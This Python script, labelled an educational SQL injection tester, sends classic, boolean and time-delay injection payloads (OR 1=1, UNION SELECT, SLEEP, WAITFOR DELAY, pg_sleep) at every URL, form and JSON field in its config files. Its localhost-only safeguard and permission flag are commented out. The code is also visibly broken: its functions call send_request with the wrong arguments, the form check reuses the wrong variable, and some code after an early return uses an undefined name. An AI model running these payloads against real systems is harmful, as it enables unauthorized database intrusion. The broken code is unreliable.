#!/usr/bin/env python3
"""
sqli_tester_adv.py - Educational SQL injection tester for AUTHORIZED testing only.

Usage examples:
  python sqli_tester_adv.py --url "http://127.0.0.1:8000/search" --param "q"
  python sqli_tester_adv.py --url "http://127.0.0.1:8000/login" --discover-forms
  python sqli_tester_adv.py --url "https://example.com/search" --param "q" --force

WARNING: Only use against systems you own or have explicit written permission to test.
"""

import argparse
import csv
import re
import time
from urllib.parse import urljoin, urlparse
import json
import requests
from bs4 import BeautifulSoup
import time

# ------------------------------
# Configuration / payloads
# ------------------------------
SQL_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"valid MySQL result",
    r"MySqlException",
    r"SQLException",
    r"Microsoft OLE DB Provider for SQL Server",
    r"Unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"PG::SyntaxError",
    r"syntax error at or near",  # Postgres
]
ERROR_RE = re.compile("|".join(SQL_ERROR_PATTERNS), re.IGNORECASE)

# Generic payloads
PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 -- ",
    "\" OR \"1\"=\"1",
    "'; -- ",
    "' UNION SELECT NULL-- ",
    "' AND 1=0 UNION SELECT 1,2,3 -- ",
    "'"
]

# Boolean payloads: one that should be true and one false
BOOLEAN_TRUE = "' OR '1'='1"
BOOLEAN_FALSE = "' OR '1'='2"

# Timing payloads (may be DB-specific)
TIMING_PAYLOADS = [
    ("MySQL", "' OR SLEEP(5) -- "),
    ("MSSQL", "'; WAITFOR DELAY '0:0:5' -- "),
    ("Postgres", "'; SELECT pg_sleep(5); -- "),
]

DEFAULT_TIMEOUT = 15
CSV_OUTPUT = "sqli_results.csv"

# ------------------------------
# Helpers
# ------------------------------

class Json:
    def __init__(self, url, json_fields, method, exp_res):
        self.url : str = url
        self.json_fields : dict[str, str] = json_fields
        self.method : str = method
        self.exp_res : int = exp_res
    def __str__(self):
        return f"Type=Json, url={self.url}, json fields= {", ".join(self.json_fields.keys())}, method={self.method}"
    
class URLQ:
    def __init__(self, url, query_fields, method, exp_res):
        self.url : str = url
        self.query_fields : dict[str, str] = query_fields
        self.method : str = method
        self.exp_res : int = exp_res
    def __str__(self):
        return f"Type=URL Query, url={self.url}, query fields= {", ".join(self.query_fields.keys())}, method={self.method}"
    
class Form:
    def __init__(self, url, data_fields, method):
        self.url : str = url
        self.data_fields : dict[str, str] = data_fields
        self.method : str = method
    def __str__(self):
        return f"Type=Form, url={self.url}, data fields= {", ".join(self.data_fields.keys())}, method={self.method}"
    
class QueryResult:
    def __init__(self, request_obj, result, reason, injection):
        self.request_obj = request_obj
        self.result = result
        self.reason = reason
        self.injection = injection
    def __str__(self):
        return f"{self.result} Reason:{self.reason} Request: {str(self.request_obj)} Injection: {self.injection}"

def looks_like_localhost(url):
    host = urlparse(url).hostname or ""
    return host in ("127.0.0.1", "localhost", "::1")

def find_forms(html, base_url):
    soup = BeautifulSoup(html, "html.parser")
    forms = []
    for form in soup.find_all("form"):
        action = form.get("action")
        method = form.get("method", "get").lower()
        inputs = {}
        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name")
            if not name:
                continue
            value = inp.get("value", "")
            inputs[name] = value
        forms.append({
            "action": urljoin(base_url, action) if action else base_url,
            "method": method,
            "inputs": inputs
        })
    return forms

def send_request(session : requests.Session, urlq : URLQ = None, form : Form = None, json : Json=None, timeout=DEFAULT_TIMEOUT, mode=""):
    try:
        match mode:
            case "json":
                if json:
                    match json.method:
                        case "get":
                            return session.get(url=json.url, json=json.json_fields, timeout=timeout)
                        case "post":
                            return session.post(url=json.url, json=json.json_fields, timeout=timeout)
                        case "delete":
                            return session.delete(url=json.url, json=json.json_fields, timeout=timeout)
                        case "put":
                            return session.put(url=json.url, json=json.json_fields, timeout=timeout)
                        case _:
                            return
            case "urlq":
                if urlq:
                    match urlq.method:
                        case "get":
                            return session.get(url=urlq.url, params=urlq.query_fields, timeout=timeout)
                        case "post":
                            return session.post(url=urlq.url, params=urlq.query_fields, timeout=timeout)
                        case "delete":
                            return session.delete(url=urlq.url, params=urlq.query_fields, timeout=timeout)
                        case "put":
                            return session.put(url=urlq.url, params=urlq.query_fields, timeout=timeout)
                        case _:
                            return
            case "form":
                if form:
                    match form.method:
                        case "get":
                            return session.get(url=form.url, data=form.data_fields, timeout=timeout)
                        case "post":
                            return session.post(url=form.url, data=form.data_fields, timeout=timeout)
                        case "delete":
                            return session.delete(url=form.url, data=form.data_fields, timeout=timeout)
                        case "put":
                            return session.put(url=form.url, data=form.data_fields, timeout=timeout)
                        case _:
                            return
            case _:
                raise Exception("Invalid mode")
    except Exception as e:
        print(f"[!] Request error: {e}")
        return None

def check_error_in_response(text):
    if not text:
        return False
    return bool(ERROR_RE.search(text))

# ------------------------------
# Core tests
# ------------------------------
def test_error_based(session, json : list[Json], urlq : list[URLQ], form : list[Form], timeout):
    findings = []
    for payload in PAYLOADS:
        print(payload)
        if json:
            for j in json:
                for key in j.json_fields:
                    j.json_fields[key] = payload
                jr = send_request(session=session, timeout=timeout, json=j, mode="json")
                if jr != None:
                    if j.exp_res != jr.status_code:
                        q = QueryResult(j,"Warning SQL injection detected!", "Mismatching status code", payload)
                    else:
                        q = QueryResult(j,"No SQL injection detected", "Matching status code", payload)
                    findings.append(q)
                    q = None
        
        if urlq:
            for u in urlq:
                for key in u.query_fields:
                    u.query_fields[key] = payload
                ur = send_request(session=session, timeout=timeout, urlq=u, mode="urlq")
                if ur:
                    if u.exp_res != ur.status_code:
                        q = QueryResult(u,"Warning SQL injection detected!", "Mismatching status code", payload)
                    else:
                        q = QueryResult(u,"No SQL injection detected", "Matching status code", payload)
                    findings.append(q)
                    q = None

        if form:
            for f in form:
                for key in f.data_fields:
                    f.data_fields[key] = payload
                fr = send_request(session=session, timeout=timeout, form=f, mode="form")
                if fr:
                    if f.exp_res != fr.status_code:
                        q = QueryResult(j,"Warning SQL injection detected!", "Mismatching status code", payload)
                    else:
                        q = QueryResult(j,"No SQL injection detected", "Matching status code", payload)
                    findings.append(q)
                    q = None

        #if method == "post":
        #    data = base_params.copy()
        #    data[param_name] = payload
        #    r = send_request(session, target_url, "post", data=data, timeout=timeout)
        #else:
        #    params = base_params.copy()
        #    params[param_name] = payload
        #    r = send_request(session, target_url, "get", params=params, timeout=timeout)
    return findings

def test_boolean_based(session, target_url, method, param_name, base_params, timeout):
    # Get baseline for comparison
    if method == "post":
        data = base_params.copy(); data[param_name] = "normalvalue"
        r_base = send_request(session, target_url, "post", data=data, timeout=timeout)
    else:
        params = base_params.copy(); params[param_name] = "normalvalue"
        r_base = send_request(session, target_url, "get", params=params, timeout=timeout)

    base_text = r_base.text if r_base else ""
    findings = []
    for true_p, false_p in [(BOOLEAN_TRUE, BOOLEAN_FALSE)]:
        if method == "post":
            tdata = base_params.copy(); tdata[param_name] = true_p
            fdata = base_params.copy(); fdata[param_name] = false_p
            rt = send_request(session, target_url, "post", data=tdata, timeout=timeout)
            rf = send_request(session, target_url, "post", data=fdata, timeout=timeout)
        else:
            tparams = base_params.copy(); tparams[param_name] = true_p
            fparams = base_params.copy(); fparams[param_name] = false_p
            rt = send_request(session, target_url, "get", params=tparams, timeout=timeout)
            rf = send_request(session, target_url, "get", params=fparams, timeout=timeout)

        txt_t = rt.text if rt else ""
        txt_f = rf.text if rf else ""
        # crude comparison: when true vs false yield visibly different bodies, it may indicate boolean SQLi
        if txt_t != txt_f:
            findings.append(("boolean", f"{true_p} / {false_p}", (rt.status_code if rt else None, rf.status_code if rf else None), "Response difference between true/false payloads"))
        else:
            findings.append(("noboolean", f"{true_p} / {false_p}", None, "No observable difference"))
    return findings

def test_timing_based(session, target_url, method, param_name, base_params, timeout, baseline=None):
    results = []
    if baseline is None:
        # measure baseline
        if method == "post":
            data = base_params.copy(); data[param_name] = "baseline_test"
            start = time.time(); send_request(session, target_url, "post", data=data, timeout=timeout); baseline = time.time() - start
        else:
            params = base_params.copy(); params[param_name] = "baseline_test"
            start = time.time(); send_request(session, target_url, "get", params=params, timeout=timeout); baseline = time.time() - start

    for dbname, payload in TIMING_PAYLOADS:
        if method == "post":
            data = base_params.copy(); data[param_name] = payload
            start = time.time(); send_request(session, target_url, "post", data=data, timeout=timeout+10); elapsed = time.time() - start
        else:
            params = base_params.copy(); params[param_name] = payload
            start = time.time(); send_request(session, target_url, "get", params=params, timeout=timeout+10); elapsed = time.time() - start

        if elapsed - baseline > 3.0:
            results.append(("timing", payload, elapsed, f"Timing anomaly vs baseline {baseline:.2f}s; db guessed {dbname}"))
        else:
            results.append(("notiming", payload, elapsed, None))
    return baseline, results

# ------------------------------
# Runner and CLI
# ------------------------------
def run_tests(target_url, run_id, dry_run, timeout):
    #if not looks_like_localhost(args.url) and not args.force:
    #    print("REFUSAL: Target is not localhost. To proceed anyway re-run with --force ONLY if you have explicit permission to test the target.")
    #    return
    #if dry_run:
    #    print("SQLI currently doesnt support dry runs")
    #    return
    session = requests.Session()
    # Optionally set headers/cookies if provided
    #if args.user_agent:
    #    session.headers.update({"User-Agent": args.user_agent})
    #if args.cookie:
    #    # cookie string like "name=value; name2=value2"
    #    cookies = {}
    #    for kv in args.cookie.split(";"):
    #        if "=" in kv:
    #            k, v = kv.strip().split("=", 1)
    #            cookies[k] = v
    #    session.cookies.update(cookies)

    #print(f"[+] Target: {args.url}")

    # The forms we will test against
    forms_config : list[Form] = []
    try:
        with open("SQLinjectionFormConfig.json", "r") as file:
            data = json.load(file)
            print("[*] Fetching page to discover forms...")

            for config in data["urls"]:
                r = session.get(config, timeout=DEFAULT_TIMEOUT)
            if not r:
                print(f"Failed to fetch page {config} for form discovery.")
            else:
                forms = find_forms(r.text, config)
                if not forms:
                    print(f"No forms discovered on the page {config}.")
                else:
                    print(f"Discovered {len(forms)} form(s)")
                    for form in forms:
                        new_form = Form(form["action"], form["inputs"].copy(), form["method"])
                        forms_config.append(new_form)
    except Exception as e:
        print(f"error reading form config file; {e}")

    json_config : list[Json] = []
    try:
        with open("SQLinjectionJsonConfig.json", "r") as file:
            data = json.load(file)
            for config in data["data"]:
                new_json = Json(config["url"], dict.fromkeys(config["data_fields"]) , config["method"], config["exp_res"])
                json_config.append(new_json)
    except Exception as e:
        print(f"error reading json config file; {e}")


    urlq_config : list[URLQ] = []
    try:
        with open("SQLinjectionQurlConfig.json", "r") as file:
            data = json.load(file)
            for config in data["data"]:
                new_urlq = URLQ(config["url"], dict.fromkeys(config["query_fields"]) , config["method"], config["exp_res"])
                urlq_config.append(new_urlq)
    except Exception as e:
        print(f"error reading urlq config file; {e}")
    
    findings = test_error_based(session=session, json=json_config, urlq=urlq_config, form=forms_config, timeout=timeout)
    for i in findings:
        print(i)
    return
    # Write CSV
    if all_findings:
        print(f"\n[+] Writing findings to {CSV_OUTPUT}")
        keys = set()
        for f in all_findings:
            keys.update(f.keys())
        keys = list(keys)
        with open(CSV_OUTPUT, "w", newline="", encoding="utf-8") as csvfile:
            writer = csv.DictWriter(csvfile, fieldnames=keys)
            writer.writeheader()
            for f in all_findings:
                writer.writerow(f)
    else:
        print("\n[-] No obvious vulnerabilities detected by these basic checks.")

    print("\n[+] Scan finished")

# ------------------------------
# CLI
# ------------------------------
def parse_args():
    p = argparse.ArgumentParser(description="Educational SQLi tester for authorized testing")
    p.add_argument("--url", required=True, help="Target URL to test")
    p.add_argument("--param", help="Parameter name(s) to test (comma separated). If omitted and --discover-forms used, will use discovered form params.")
    p.add_argument("--query", help="The url querys to test(comma seperated)")
    p.add_argument("--method", help="The method of the CRUD api operation")
    p.add_argument("--discover-forms", action="store_true", help="Fetch the page and try to discover forms and their inputs")
    p.add_argument("--force", action="store_true", help="Allow non-localhost targets (only use with explicit permission)")
    p.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="Request timeout seconds")
    p.add_argument("--user-agent", help="Optional user agent string to set")
    p.add_argument("--cookie", help="Optional cookie string to include (e.g. 'SESSION=abc; foo=bar')")
    return p.parse_args()

if __name__ == "__main__":
    #args = parse_args()
    run_tests(None, None, None, 5)